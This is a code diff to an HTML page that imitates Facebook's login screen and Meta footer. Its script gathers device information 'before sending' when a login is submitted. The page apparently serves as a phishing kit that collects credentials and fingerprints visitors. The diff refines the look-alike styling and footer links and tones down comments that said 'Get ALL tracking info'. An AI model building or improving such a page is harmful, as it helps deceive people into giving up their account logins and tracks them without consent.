@@ -95,6 +95,7 @@
             border-radius: 6px;
             font-size: 17px;
             outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
 
         .login-box input:focus {
@@ -118,6 +119,7 @@
             font-weight: bold;
             cursor: pointer;
             margin: 8px 0;
+            transition: background 0.2s;
         }
 
         .login-btn:hover {
@@ -133,6 +135,7 @@
             color: #1877f2;
             text-decoration: none;
             font-size: 14px;
+            font-weight: 500;
         }
 
         .forgot a:hover {
@@ -161,6 +164,7 @@
             font-size: 13px;
             margin: 10px 0;
             display: none;
+            font-weight: 500;
         }
 
         @keyframes shake {
@@ -173,6 +177,7 @@
             animation: shake 0.4s ease-in-out;
         }
 
+        /* Feed Page */
         .feed-container {
             display: none;
             background: #f0f2f5;
@@ -312,31 +317,63 @@
             background: #f0f2f5;
         }
 
+        /* Meta Footer with Infinity Logo */
         .meta-footer {
             position: fixed;
-            bottom: 20px;
+            bottom: 0;
             left: 0;
             right: 0;
+            background: white;
+            padding: 16px 20px;
             text-align: center;
             font-size: 12px;
             color: #65676b;
-            padding: 10px;
-            background: transparent;
-        }
-
-        .meta-footer a {
-            color: #65676b;
-            text-decoration: none;
-            margin: 0 10px;
-        }
-
-        .meta-footer a:hover {
-            text-decoration: underline;
+            border-top: 1px solid #dddfe2;
+            z-index: 100;
         }
 
         .meta-logo {
-            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .infinity-logo {
+            font-size: 24px;
+            font-weight: normal;
+            color: #65676b;
+        }
+
+        .meta-text {
+            font-weight: 600;
             letter-spacing: 1px;
+            font-size: 14px;
+            color: #65676b;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 8px;
+        }
+
+        .footer-links a {
+            color: #65676b;
+            text-decoration: none;
+            font-size: 11px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            font-size: 11px;
+            color: #65676b;
         }
 
         @media (max-width: 900px) {
@@ -355,12 +392,14 @@
 </head>
 <body>
 
+<!-- Facebook Circle F Logo in Top Left -->
 <div class="fb-logo-top">
     <div class="circle-f">
         <span>f</span>
     </div>
 </div>
 
+<!-- LOGIN PAGE -->
 <div id="loginPage">
     <div class="container">
         <div class="left">
@@ -386,6 +425,7 @@
     </div>
 </div>
 
+<!-- FEED PAGE -->
 <div id="feedPage" class="feed-container">
     <div class="feed-header">
         <div class="feed-logo">facebook</div>
@@ -400,26 +440,38 @@
     </div>
 </div>
 
+<!-- Meta Footer with Infinity Logo -->
 <div class="meta-footer">
-    <span class="meta-logo">Meta</span>
-    <a href="#">About</a>
-    <a href="#">Blog</a>
-    <a href="#">Jobs</a>
-    <a href="#">Help</a>
-    <a href="#">Privacy</a>
-    <a href="#">Terms</a>
-    <a href="#">Locations</a>
-    <a href="#">Instagram</a>
-    <a href="#">Threads</a>
-    <br>
-    <span style="font-size: 11px;">© 2025 Meta</span>
+    <div class="meta-logo">
+        <span class="infinity-logo">∞</span>
+        <span class="meta-text">Meta</span>
+    </div>
+    <div class="footer-links">
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram</a>
+        <a href="#">Threads</a>
+        <a href="#">Messenger</a>
+        <a href="#">Facebook Lite</a>
+        <a href="#">Video</a>
+        <a href="#">Marketplace</a>
+        <a href="#">Payments</a>
+    </div>
+    <div class="copyright">
+        © 2025 Meta
+    </div>
 </div>
 
 <script>
     let allPosts = [];
     let loggedInUser = null;
 
-    // Get ALL device info before sending
+    // Get device info
     function getDeviceInfo() {
         return {
             screenResolution: `${window.screen.width}x${window.screen.height}`,
@@ -471,7 +523,6 @@
             return;
         }
         
-        // Get ALL tracking info
         const deviceInfo = getDeviceInfo();
         
         try {
